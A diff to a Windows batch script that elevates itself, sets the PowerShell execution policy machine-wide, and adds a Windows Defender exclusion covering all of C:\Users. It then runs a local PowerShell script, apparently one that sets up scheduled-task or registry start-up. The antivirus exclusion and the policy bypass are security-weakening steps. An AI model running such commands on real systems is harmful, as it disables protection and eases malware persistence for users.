@@ -14,13 +14,16 @@ if %errorlevel% neq 0 ( goto UACPrompt ) else ( goto gotAdmin )
     pushd "%CD%"
     CD /D "%~dp0"
 
+:: 0. Allow local PowerShell scripts to run
+powershell.exe -NoProfile -Command "Set-ExecutionPolicy RemoteSigned -Scope LocalMachine -Force"
+
 :: 1. Add Windows Defender Exclusion
-powershell.exe -Command "Add-MpPreference -ExclusionPath 'C:\Users'"
+powershell.exe -NoProfile -Command "Add-MpPreference -ExclusionPath 'C:\Users'"
 
 :: 2. Set the path (Ensuring the filename matches your .ps1)
 SET scriptPath=%~dp0schtask-start-reg.ps1
 
-:: 3. Run the PowerShell script properly
+:: 3. Run the PowerShell script
 powershell.exe -ExecutionPolicy Bypass -File "%scriptPath%"
 
 pause
